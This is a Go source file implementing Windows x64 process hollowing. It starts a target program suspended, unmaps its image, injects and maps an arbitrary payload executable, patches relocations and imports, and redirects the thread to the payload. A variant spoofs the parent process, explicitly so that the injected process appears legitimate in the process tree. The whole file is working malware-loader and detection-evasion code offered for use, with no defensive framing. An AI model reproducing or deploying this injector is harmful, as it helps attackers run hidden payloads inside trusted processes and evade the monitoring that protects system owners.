package hollow

// hollow.go -- Process hollowing for Windows 64-bit Go PE payloads.
//
// Technique: Classic process hollowing (CREATE_SUSPENDED + NtUnmapViewOfSection).
//   1. CreateProcess(target, CREATE_SUSPENDED)
//   2. NtQueryInformationProcess -> PEB address
//   3. Read PEB.ImageBaseAddress -> original image base
//   4. NtUnmapViewOfSection(original base)
//   5. VirtualAllocEx(preferred base, SizeOfImage) -- reserve
//   6. Commit + write PE headers and sections
//   7. Set per-section page protections
//   8. Apply base relocations if newBase != preferredBase
//   9. Fix IAT by resolving imports from our own process address space
//  10. Update PEB.ImageBaseAddress = newBase
//  11. GetThreadContext -> modify RIP to OEP -> SetThreadContext
//  12. ResumeThread
//
// IAT resolution uses our own process as a reference: system DLLs
// (kernel32, ntdll, ws2_32 etc.) load at identical addresses in all processes
// per boot due to ASLR's per-session randomization for KnownDLLs.
//
// PPID spoofing variant: HollowProcessPPID creates the target process with
// a spoofed parent (e.g. explorer.exe) via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
// making the process appear legitimate in the process tree.

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

var (
	modKernel32 = syscall.NewLazyDLL("kernel32.dll")
	modNtdll    = syscall.NewLazyDLL("ntdll.dll")

	procCreateProcessW            = modKernel32.NewProc("CreateProcessW")
	procVirtualAllocEx            = modKernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx          = modKernel32.NewProc("VirtualProtectEx")
	procWriteProcessMemory        = modKernel32.NewProc("WriteProcessMemory")
	procReadProcessMemory         = modKernel32.NewProc("ReadProcessMemory")
	procGetThreadContext          = modKernel32.NewProc("GetThreadContext")
	procSetThreadContext          = modKernel32.NewProc("SetThreadContext")
	procResumeThread              = modKernel32.NewProc("ResumeThread")
	procTerminateProcess          = modKernel32.NewProc("TerminateProcess")
	procCloseHandle               = modKernel32.NewProc("CloseHandle")
	procVirtualAlloc              = modKernel32.NewProc("VirtualAlloc")
	procVirtualFree               = modKernel32.NewProc("VirtualFree")
	procGetModuleHandleA          = modKernel32.NewProc("GetModuleHandleA")
	procLoadLibraryA              = modKernel32.NewProc("LoadLibraryA")
	procGetProcAddress            = modKernel32.NewProc("GetProcAddress")
	procOpenProcess               = modKernel32.NewProc("OpenProcess")
	procCreateToolhelp32Snapshot  = modKernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW           = modKernel32.NewProc("Process32FirstW")
	procProcess32NextW            = modKernel32.NewProc("Process32NextW")
	procInitProcThreadAttrList    = modKernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttr      = modKernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttrList  = modKernel32.NewProc("DeleteProcThreadAttributeList")

	procNtUnmapViewOfSection      = modNtdll.NewProc("NtUnmapViewOfSection")
	procNtQueryInformationProcess = modNtdll.NewProc("NtQueryInformationProcess")
)

const (
	createSuspendedFlag          = uint32(0x00000004)
	extendedStartupInfoPresent   = uint32(0x00080000)
	memReserve                   = uint32(0x00002000)
	memCommit                    = uint32(0x00001000)
	memRelease                   = uint32(0x00008000)
	pageNoaccess                 = uint32(0x01)
	pageReadonly                 = uint32(0x02)
	pageReadwrite                = uint32(0x04)
	pageExecuteRead              = uint32(0x20)
	pageExecuteReadwrite         = uint32(0x40)
	processCreateProcess         = uint32(0x0080)
	th32csSnapProcess            = uint32(0x00000002)
	contextFull                  = uint32(0x0010003B)
	contextSize                  = 1232
	ripOffset                    = 248 // offset of Rip in x64 CONTEXT (0xF8)
	contextFlagsOffset           = 48  // offset of ContextFlags (0x30)
	procThreadAttrParentProcess  = uintptr(0x00020000)
)

// STARTUPINFOW (104 bytes, x64 layout with padding)
type siW struct {
	cb              uint32
	_               uint32  // 4-byte pad: aligns next pointer to offset 8
	lpReserved      uintptr
	lpDesktop       uintptr
	lpTitle         uintptr
	dwX             uint32
	dwY             uint32
	dwXSize         uint32
	dwYSize         uint32
	dwXCountChars   uint32
	dwYCountChars   uint32
	dwFillAttribute uint32
	dwFlags         uint32
	wShowWindow     uint16
	cbReserved2     uint16
	_               uint32  // 4-byte pad: aligns lpReserved2 to offset 72
	lpReserved2     uintptr
	hStdInput       uintptr
	hStdOutput      uintptr
	hStdError       uintptr
}

// STARTUPINFOEXW extends STARTUPINFOW with an attribute list (for PPID spoofing)
type siExW struct {
	si       siW
	attrList uintptr
}

// PROCESS_INFORMATION (24 bytes)
type procInfo struct {
	hProcess  syscall.Handle
	hThread   syscall.Handle
	processID uint32
	threadID  uint32
}

// PROCESS_BASIC_INFORMATION (48 bytes, x64)
type procBasicInfo struct {
	reserved1      uintptr
	pebBaseAddress uintptr
	reserved2      [2]uintptr
	uniquePID      uintptr
	reserved3      uintptr
}

// PROCESSENTRY32W (568 bytes)
type processEntry32W struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

// peHeaders holds parsed PE metadata needed for hollowing
type peHeaders struct {
	imageBase  uint64
	imageSize  uint32
	headerSize uint32
	entryPoint uint32
	sections   []*pe.Section
	relocRVA   uint32
	relocSize  uint32
	importRVA  uint32
	importSize uint32
}

// HollowProcess hollows targetExe with payload using standard process hollowing.
func HollowProcess(targetExe string, payload []byte) error {
	return hollowProcess(targetExe, payload, 0)
}

// HollowProcessPPID hollows targetExe with the given parentExe as spoofed PPID.
// If parentExe is "" or the parent cannot be found, falls back to HollowProcess.
func HollowProcessPPID(targetExe string, payload []byte, parentExe string) error {
	ppid := syscall.Handle(0)
	if parentExe != "" {
		if pid, ok := findProcessPID(parentExe); ok {
			h, _, _ := procOpenProcess.Call(uintptr(processCreateProcess), 0, uintptr(pid))
			ppid = syscall.Handle(h)
		}
	}
	err := hollowProcess(targetExe, payload, ppid)
	if ppid != 0 {
		procCloseHandle.Call(uintptr(ppid))
	}
	return err
}

func hollowProcess(targetExe string, payload []byte, ppidHandle syscall.Handle) (retErr error) {
	hdr, err := parsePE(payload)
	if err != nil {
		return fmt.Errorf("hollow: parse PE: %w", err)
	}

	pi, err := createSuspended(targetExe, ppidHandle)
	if err != nil {
		return fmt.Errorf("hollow: CreateProcess: %w", err)
	}
	cleanup := true
	defer func() {
		if cleanup {
			procTerminateProcess.Call(uintptr(pi.hProcess), 1)
		}
		procCloseHandle.Call(uintptr(pi.hThread))
		procCloseHandle.Call(uintptr(pi.hProcess))
	}()

	pebAddr, err := getRemotePEB(pi.hProcess)
	if err != nil {
		return fmt.Errorf("hollow: get PEB: %w", err)
	}

	origBase, err := readRemoteUintptr(pi.hProcess, pebAddr+0x10)
	if err != nil {
		return fmt.Errorf("hollow: read image base from PEB: %w", err)
	}

	// Unmap original PE (ignore error -- may already be absent)
	procNtUnmapViewOfSection.Call(uintptr(pi.hProcess), origBase)

	// Reserve full virtual range at preferred base
	newBase, err := allocReserveRemote(pi.hProcess, uintptr(hdr.imageBase), hdr.imageSize)
	if err != nil {
		return fmt.Errorf("hollow: VirtualAllocEx reserve: %w", err)
	}

	// Commit + write headers
	if err = commitRemote(pi.hProcess, newBase, hdr.headerSize); err != nil {
		return fmt.Errorf("hollow: commit headers: %w", err)
	}
	if err = writeRemote(pi.hProcess, newBase, payload[:hdr.headerSize]); err != nil {
		return fmt.Errorf("hollow: write headers: %w", err)
	}

	// Commit + write sections with correct protections
	for _, sec := range hdr.sections {
		if sec.Offset == 0 {
			continue
		}
		vaddr := uintptr(sec.VirtualAddress)
		vsz := sec.VirtualSize
		if vsz == 0 {
			vsz = sec.Size
		}
		if vsz == 0 {
			continue
		}

		secAddr := newBase + vaddr
		if err = commitRemote(pi.hProcess, secAddr, vsz); err != nil {
			continue
		}

		// Write raw data (may be smaller than virtual size; rest is zero-initialised)
		if sec.Size > 0 && sec.Offset < uint32(len(payload)) {
			end := sec.Offset + sec.Size
			if end > uint32(len(payload)) {
				end = uint32(len(payload))
			}
			if err2 := writeRemote(pi.hProcess, secAddr, payload[sec.Offset:end]); err2 != nil {
				return fmt.Errorf("hollow: write section %s: %w", sec.Name, err2)
			}
		}

		// Apply correct page protection
		var oldProt uint32
		prot := sectionProtect(sec.Characteristics)
		procVirtualProtectEx.Call(
			uintptr(pi.hProcess), secAddr, uintptr(vsz),
			uintptr(prot), uintptr(unsafe.Pointer(&oldProt)),
		)
	}

	// Apply base relocations if newBase differs from preferred
	delta := int64(newBase) - int64(hdr.imageBase)
	if delta != 0 && hdr.relocRVA != 0 {
		if err = applyRelocations(pi.hProcess, newBase, delta, payload, hdr.sections, hdr.relocRVA, hdr.relocSize); err != nil {
			return fmt.Errorf("hollow: relocations: %w", err)
		}
	}

	// Fix IAT by copying resolved addresses from our own process
	if hdr.importRVA != 0 {
		if err = fixImports(pi.hProcess, newBase, payload, hdr.sections, hdr.importRVA); err != nil {
			return fmt.Errorf("hollow: fix imports: %w", err)
		}
	}

	// Update PEB.ImageBaseAddress
	if err = writeRemoteUintptr(pi.hProcess, pebAddr+0x10, newBase); err != nil {
		return fmt.Errorf("hollow: update PEB: %w", err)
	}

	// Redirect thread to our entry point
	rip := uint64(newBase) + uint64(hdr.entryPoint)
	if err = setThreadRIP(pi.hThread, rip); err != nil {
		return fmt.Errorf("hollow: SetThreadContext: %w", err)
	}

	// Resume
	r, _, e := procResumeThread.Call(uintptr(pi.hThread))
	if r == ^uintptr(0) {
		return fmt.Errorf("hollow: ResumeThread: %v", e)
	}

	cleanup = false
	return nil
}

// ---- PE parsing ----

func parsePE(payload []byte) (*peHeaders, error) {
	f, err := pe.NewFile(bytes.NewReader(payload))
	if err != nil {
		return nil, err
	}

	opt, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return nil, fmt.Errorf("not a 64-bit PE (PE32+)")
	}

	hdr := &peHeaders{
		imageBase:  opt.ImageBase,
		imageSize:  opt.SizeOfImage,
		headerSize: opt.SizeOfHeaders,
		entryPoint: opt.AddressOfEntryPoint,
		sections:   f.Sections,
	}

	if len(opt.DataDirectory) > 1 {
		hdr.importRVA = opt.DataDirectory[1].VirtualAddress
		hdr.importSize = opt.DataDirectory[1].Size
	}
	if len(opt.DataDirectory) > 5 {
		hdr.relocRVA = opt.DataDirectory[5].VirtualAddress
		hdr.relocSize = opt.DataDirectory[5].Size
	}
	return hdr, nil
}

// rvaToFileOffset converts a virtual address to a file offset via the section table.
func rvaToFileOffset(rva uint32, sections []*pe.Section) (int, bool) {
	for _, sec := range sections {
		if rva >= sec.VirtualAddress && rva < sec.VirtualAddress+sec.VirtualSize {
			return int(sec.Offset) + int(rva-sec.VirtualAddress), true
		}
	}
	return 0, false
}

func readCString(data []byte, off int) string {
	if off < 0 || off >= len(data) {
		return ""
	}
	end := off
	for end < len(data) && data[end] != 0 {
		end++
	}
	return string(data[off:end])
}

// ---- Relocation fixup ----

func applyRelocations(hProc syscall.Handle, newBase uintptr, delta int64, payload []byte, sections []*pe.Section, relocRVA, relocSize uint32) error {
	fileOff, ok := rvaToFileOffset(relocRVA, sections)
	if !ok {
		return nil // no reloc section in file (pre-linked)
	}
	end := fileOff + int(relocSize)
	if end > len(payload) {
		end = len(payload)
	}

	pos := fileOff
	for pos+8 <= end {
		blockRVA := binary.LittleEndian.Uint32(payload[pos:])
		blockSize := binary.LittleEndian.Uint32(payload[pos+4:])
		if blockSize < 8 || blockRVA == 0 {
			break
		}
		numEntries := (int(blockSize) - 8) / 2
		for i := 0; i < numEntries; i++ {
			eOff := pos + 8 + i*2
			if eOff+2 > end {
				break
			}
			entry := binary.LittleEndian.Uint16(payload[eOff:])
			if entry>>12 != 0xA { // IMAGE_REL_BASED_DIR64
				continue
			}
			addr := newBase + uintptr(blockRVA) + uintptr(entry&0x0FFF)
			cur, err := readRemoteUint64(hProc, addr)
			if err != nil {
				return err
			}
			cur = uint64(int64(cur) + delta)
			if err = writeRemoteUint64(hProc, addr, cur); err != nil {
				return err
			}
		}
		pos += int(blockSize)
	}
	return nil
}

// ---- Import fixup ----

func fixImports(hProc syscall.Handle, newBase uintptr, payload []byte, sections []*pe.Section, importRVA uint32) error {
	fileOff, ok := rvaToFileOffset(importRVA, sections)
	if !ok {
		return nil
	}

	// Walk IMAGE_IMPORT_DESCRIPTOR entries (20 bytes each, null-terminated)
	for pos := fileOff; pos+20 <= len(payload); pos += 20 {
		origFT := binary.LittleEndian.Uint32(payload[pos:])
		nameRVA := binary.LittleEndian.Uint32(payload[pos+12:])
		firstThunk := binary.LittleEndian.Uint32(payload[pos+16:])

		if nameRVA == 0 {
			break
		}

		nameOff, ok := rvaToFileOffset(nameRVA, sections)
		if !ok {
			continue
		}
		dllName := readCString(payload, nameOff)

		// Load DLL (already present in our process -- system DLLs share addresses)
		dllNameB := append([]byte(strings.ToLower(dllName)), 0)
		hDLL, _, _ := procGetModuleHandleA.Call(uintptr(unsafe.Pointer(&dllNameB[0])))
		runtime.KeepAlive(dllNameB)
		if hDLL == 0 {
			hDLL, _, _ = procLoadLibraryA.Call(uintptr(unsafe.Pointer(&dllNameB[0])))
			runtime.KeepAlive(dllNameB)
		}
		if hDLL == 0 {
			continue
		}

		// Walk thunks: prefer OriginalFirstThunk (INT); fall back to FirstThunk
		thunkRVA := origFT
		if thunkRVA == 0 {
			thunkRVA = firstThunk
		}
		thunkOff, ok := rvaToFileOffset(thunkRVA, sections)
		if !ok {
			continue
		}

		for i := 0; thunkOff+i*8+8 <= len(payload); i++ {
			thunk := binary.LittleEndian.Uint64(payload[thunkOff+i*8:])
			if thunk == 0 {
				break
			}

			var funcAddr uintptr
			if thunk&(1<<63) != 0 {
				// Ordinal import
				funcAddr, _, _ = procGetProcAddress.Call(hDLL, uintptr(thunk&0xFFFF))
			} else {
				// Name import: IMAGE_IMPORT_BY_NAME = {WORD hint; CHAR name[]}
				hintOff, ok := rvaToFileOffset(uint32(thunk), sections)
				if !ok {
					continue
				}
				funcName := readCString(payload, hintOff+2)
				fnb := append([]byte(funcName), 0)
				funcAddr, _, _ = procGetProcAddress.Call(hDLL, uintptr(unsafe.Pointer(&fnb[0])))
				runtime.KeepAlive(fnb)
			}

			if funcAddr != 0 {
				// Write resolved address into remote IAT entry
				iatAddr := newBase + uintptr(firstThunk) + uintptr(i*8)
				_ = writeRemoteUint64(hProc, iatAddr, uint64(funcAddr))
			}
		}
	}
	return nil
}

// ---- Process creation ----

func createSuspended(exe string, ppidHandle syscall.Handle) (procInfo, error) {
	exeUTF16, err := syscall.UTF16PtrFromString(exe)
	if err != nil {
		return procInfo{}, err
	}

	var pi procInfo

	if ppidHandle != 0 {
		return createSuspendedWithPPID(exeUTF16, ppidHandle, &pi)
	}

	var si siW
	si.cb = uint32(unsafe.Sizeof(si))

	r, _, e := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(exeUTF16)),
		0, 0, 0, 0,
		uintptr(createSuspendedFlag),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	runtime.KeepAlive(exeUTF16)
	if r == 0 {
		return procInfo{}, fmt.Errorf("CreateProcessW: %v", e)
	}
	return pi, nil
}

func createSuspendedWithPPID(exeUTF16 *uint16, ppidHandle syscall.Handle, pi *procInfo) (procInfo, error) {
	// Determine attribute list size
	var attrListSize uintptr
	procInitProcThreadAttrList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))

	// Allocate attribute list
	attrBuf := make([]byte, attrListSize)
	r, _, e := procInitProcThreadAttrList.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])),
		1, 0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)
	if r == 0 {
		return procInfo{}, fmt.Errorf("InitializeProcThreadAttributeList: %v", e)
	}
	defer procDeleteProcThreadAttrList.Call(uintptr(unsafe.Pointer(&attrBuf[0])))

	// Set parent process attribute
	r, _, e = procUpdateProcThreadAttr.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])),
		0,
		procThreadAttrParentProcess,
		uintptr(unsafe.Pointer(&ppidHandle)),
		unsafe.Sizeof(ppidHandle),
		0, 0,
	)
	runtime.KeepAlive(attrBuf)
	if r == 0 {
		return procInfo{}, fmt.Errorf("UpdateProcThreadAttribute: %v", e)
	}

	var siEx siExW
	siEx.si.cb = uint32(unsafe.Sizeof(siEx))
	siEx.attrList = uintptr(unsafe.Pointer(&attrBuf[0]))

	flags := uintptr(createSuspendedFlag | extendedStartupInfoPresent)
	r, _, e = procCreateProcessW.Call(
		uintptr(unsafe.Pointer(exeUTF16)),
		0, 0, 0, 0,
		flags,
		0, 0,
		uintptr(unsafe.Pointer(&siEx)),
		uintptr(unsafe.Pointer(pi)),
	)
	runtime.KeepAlive(attrBuf)
	runtime.KeepAlive(exeUTF16)
	if r == 0 {
		return procInfo{}, fmt.Errorf("CreateProcessW (PPID spoof): %v", e)
	}
	return *pi, nil
}

// ---- Remote process helpers ----

func getRemotePEB(hProc syscall.Handle) (uintptr, error) {
	var pbi procBasicInfo
	var retLen uint32
	r, _, _ := procNtQueryInformationProcess.Call(
		uintptr(hProc),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess: NTSTATUS=0x%X", r)
	}
	return pbi.pebBaseAddress, nil
}

func readRemoteUintptr(hProc syscall.Handle, addr uintptr) (uintptr, error) {
	var val uint64
	var read uintptr
	r, _, e := procReadProcessMemory.Call(
		uintptr(hProc), addr,
		uintptr(unsafe.Pointer(&val)), 8,
		uintptr(unsafe.Pointer(&read)),
	)
	if r == 0 {
		return 0, fmt.Errorf("ReadProcessMemory: %v", e)
	}
	return uintptr(val), nil
}

func writeRemoteUintptr(hProc syscall.Handle, addr, val uintptr) error {
	return writeRemoteUint64(hProc, addr, uint64(val))
}

func readRemoteUint64(hProc syscall.Handle, addr uintptr) (uint64, error) {
	var val uint64
	var read uintptr
	r, _, e := procReadProcessMemory.Call(
		uintptr(hProc), addr,
		uintptr(unsafe.Pointer(&val)), 8,
		uintptr(unsafe.Pointer(&read)),
	)
	if r == 0 {
		return 0, fmt.Errorf("ReadProcessMemory(8): %v", e)
	}
	return val, nil
}

func writeRemoteUint64(hProc syscall.Handle, addr uintptr, val uint64) error {
	var written uintptr
	r, _, e := procWriteProcessMemory.Call(
		uintptr(hProc), addr,
		uintptr(unsafe.Pointer(&val)), 8,
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		return fmt.Errorf("WriteProcessMemory(8): %v", e)
	}
	return nil
}

func writeRemote(hProc syscall.Handle, addr uintptr, data []byte) error {
	if len(data) == 0 {
		return nil
	}
	var written uintptr
	r, _, e := procWriteProcessMemory.Call(
		uintptr(hProc), addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	runtime.KeepAlive(data)
	if r == 0 {
		return fmt.Errorf("WriteProcessMemory(%d): %v", len(data), e)
	}
	return nil
}

// allocReserveRemote reserves (without committing) the full image range.
// Tries preferred base first; falls back to any address.
func allocReserveRemote(hProc syscall.Handle, base uintptr, size uint32) (uintptr, error) {
	r, _, _ := procVirtualAllocEx.Call(
		uintptr(hProc), base, uintptr(size),
		uintptr(memReserve), uintptr(pageNoaccess),
	)
	if r != 0 {
		return r, nil
	}
	// Fallback: any address
	r, _, e := procVirtualAllocEx.Call(
		uintptr(hProc), 0, uintptr(size),
		uintptr(memReserve), uintptr(pageNoaccess),
	)
	if r == 0 {
		return 0, fmt.Errorf("VirtualAllocEx(reserve): %v", e)
	}
	return r, nil
}

// commitRemote commits a previously reserved range with PAGE_READWRITE.
func commitRemote(hProc syscall.Handle, addr uintptr, size uint32) error {
	if size == 0 {
		size = 0x1000
	}
	r, _, e := procVirtualAllocEx.Call(
		uintptr(hProc), addr, uintptr(size),
		uintptr(memCommit), uintptr(pageReadwrite),
	)
	if r == 0 {
		return fmt.Errorf("VirtualAllocEx(commit): %v", e)
	}
	return nil
}

// sectionProtect maps PE section characteristics to VirtualProtect flags.
func sectionProtect(chars uint32) uint32 {
	const (
		secExec  = uint32(0x20000000)
		secRead  = uint32(0x40000000)
		secWrite = uint32(0x80000000)
	)
	switch {
	case chars&secExec != 0 && chars&secWrite != 0:
		return pageExecuteReadwrite
	case chars&secExec != 0:
		return pageExecuteRead
	case chars&secWrite != 0:
		return pageReadwrite
	default:
		return pageReadonly
	}
}

// ---- Thread context manipulation ----

func setThreadRIP(hThread syscall.Handle, rip uint64) error {
	// VirtualAlloc guarantees page-aligned (4096-byte) allocation, satisfying
	// CONTEXT's DECLSPEC_ALIGN(16) requirement.
	ctxPtr, _, e := procVirtualAlloc.Call(
		0, contextSize,
		uintptr(memCommit|memReserve),
		uintptr(pageReadwrite),
	)
	if ctxPtr == 0 {
		return fmt.Errorf("VirtualAlloc CONTEXT: %v", e)
	}
	defer procVirtualFree.Call(ctxPtr, 0, uintptr(memRelease))

	// Set ContextFlags = CONTEXT_FULL to capture all registers
	*(*uint32)(unsafe.Pointer(ctxPtr + contextFlagsOffset)) = contextFull

	r, _, e := procGetThreadContext.Call(uintptr(hThread), ctxPtr)
	if r == 0 {
		return fmt.Errorf("GetThreadContext: %v", e)
	}

	// Overwrite RIP
	*(*uint64)(unsafe.Pointer(ctxPtr + ripOffset)) = rip

	r, _, e = procSetThreadContext.Call(uintptr(hThread), ctxPtr)
	if r == 0 {
		return fmt.Errorf("SetThreadContext: %v", e)
	}
	return nil
}

// ---- PPID helper ----

func findProcessPID(exeName string) (uint32, bool) {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(uintptr(th32csSnapProcess), 0)
	if snap == uintptr(syscall.InvalidHandle) {
		return 0, false
	}
	defer procCloseHandle.Call(snap)

	var entry processEntry32W
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	r, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if r == 0 {
		return 0, false
	}

	target := strings.ToLower(exeName)
	for {
		name := strings.ToLower(syscall.UTF16ToString(entry.szExeFile[:]))
		if name == target {
			return entry.th32ProcessID, true
		}
		entry.dwSize = uint32(unsafe.Sizeof(entry))
		r, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if r == 0 {
			break
		}
	}
	return 0, false
}
